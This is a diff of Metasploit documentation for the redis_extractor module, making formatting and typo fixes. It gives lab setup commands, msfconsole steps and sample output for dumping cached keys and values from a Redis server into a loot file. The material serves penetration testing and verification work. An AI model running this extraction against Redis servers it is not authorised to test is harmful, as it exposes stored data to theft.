@@ -10,7 +10,7 @@ To prepare a test instance of Redis,first install Redis v2.8.0 or greater. This 
 
 Next, add some data to the database:
 
-`echo 'set key1 value1' | nc 127.0.0.1 6379 > /dev/null`(MacOS, may differ on Linux)
+`echo 'set key1 value1' | nc 127.0.0.1 6379 > /dev/null` (MacOS, may differ on Linux)
 
 Alternately, to run docker with a password:
 
@@ -23,15 +23,15 @@ echo 'auth abcde \n set key2 value2' | nc 127.0.0.1 6379 > /dev/null
 ## Verification Steps
 
 1. Install Redis and add data as described above.
-2. Start `msfconsole`
-3. Do: `use auxiliary/gather/redis_extractor`
-4. Do: `set rhosts [ip.of.redis.app]` 
-5. Do: `set PASSWORD [redis_password]` (optional)
-5. Do: `check` (optional)
-6. You will receive information about the Redis instalce.
-7. Do: `run`
-8. You will receive a screendump of the cached keys and contet.
-9. A CSV file with keys and content will be saved in your loot directory.
+1. Start `msfconsole`
+1. Do: `use auxiliary/gather/redis_extractor`
+1. Do: `set rhosts [ip.of.redis.app]` 
+1. Do: `set PASSWORD [redis_password]` (optional)
+1. Do: `check` (optional)
+1. You will receive information about the Redis instalce.
+1. Do: `run`
+1. You will receive a screendump of the cached keys and contet.
+1. A CSV file with keys and content will be saved in your loot directory.
 
 ## Options
 
@@ -43,28 +43,28 @@ The password for the redis instance. This value will be ignored for instances wi
 
 ### Check 
 
-```bash
+```
 msf6 > use auxiliary/gather/redis_extractor
 msf6 auxiliary(gather/redis_extractor) > set rhosts 172.22.12.168
 rhosts => 172.22.12.168
 msf6 auxiliary(gather/redis_extractor) > check
 
 [+] 172.22.12.168:6379    - Connected to Redis version 6.0.8
- *] 172.22.12.168:6379    - OS is Linux 5.4.39-linuxkit x86_64
+[*] 172.22.12.168:6379    - OS is Linux 5.4.39-linuxkit x86_64
 [*] 172.22.12.168:6379 - The target appears to be vulnerable.
 msf6 auxiliary(gather/redis_extractor) >
 ```
 
 ### Run
 
-```bash
+```
 msf6 > use auxiliary/gather/redis_extractor
 msf6 auxiliary(gather/redis_extractor) > set rhosts 172.22.12.168
 rhosts => 172.22.12.168
 msf6 auxiliary(gather/redis_extractor) > run
 
 [+] 172.22.12.168:6379    - Connected to Redis version 6.0.8
-[*] 172.22.12.168:6379    - Extracting about 1 keys from databaase 0
+[*] 172.22.12.168:6379    - Extracting about 1 keys from database 0
 
 Data from 172.22.12.168:6379    database 0
 ==========================================
